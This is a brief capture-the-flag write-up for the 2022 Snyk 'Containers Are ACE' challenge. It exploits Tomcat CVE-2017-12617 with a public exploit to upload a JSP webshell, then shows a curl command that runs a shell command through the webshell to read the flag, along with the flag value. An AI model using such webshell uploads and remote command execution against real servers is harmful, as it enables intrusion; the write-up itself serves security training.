# 2022 Snyk - Containers Are ACE

Challenge contained some kind of a web app, but the labels on the challenge description were:
- java
- tomcat
- Snyk Container

Tomcat hinted that this might be a plain exploit for Tomcat that we can use. Additionally, the web app contained `© 2015 Todolist MVC` in the footer, enforcing this idea even more.

I quickly found CVE-2017-12617, more info on https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHETOMCAT-31537. There is a ready-made exploit for this vulnerability on Github that worked out of the box.

We have uploaded our webshell and found the flag under `webapps/todolist/flag`:
```sh
$ curl -sS "http://containers-are-ace.c.ctf-snyk.io/56ke1a.jsp?cmd=cat+webapps%2Ftodolist%2Fflag" | grep SNYK
<pre>SNYK{9a6a1fff87f3cfdca056a077804838d4e87f25f6a11e09627092c06f142b10yf}</pre>
```
